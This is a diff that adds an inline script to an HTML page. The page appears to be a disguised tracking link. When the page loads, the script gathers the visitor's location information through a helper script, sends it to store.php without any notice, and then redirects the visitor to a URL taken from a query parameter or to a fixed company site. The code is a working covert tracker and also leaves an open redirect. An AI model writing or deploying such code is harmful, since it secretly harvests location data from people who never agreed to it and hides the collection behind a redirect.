@@ -6,5 +6,28 @@
   </head>
   <body>
     <script src="client-locator.js"></script>
+      <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const to = urlParams.get('t');
+
+        (async () => {
+            const clientLocationInfo = await getClientLocationInfo();
+
+            await fetch('store.php', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(clientLocationInfo),
+            });
+
+            if(to){
+                window.location.href = to;
+            }
+            else {
+                window.location.href = "https://www.aljamili-trading.com";
+            }
+        })();
+      </script>
   </body>
 </html>
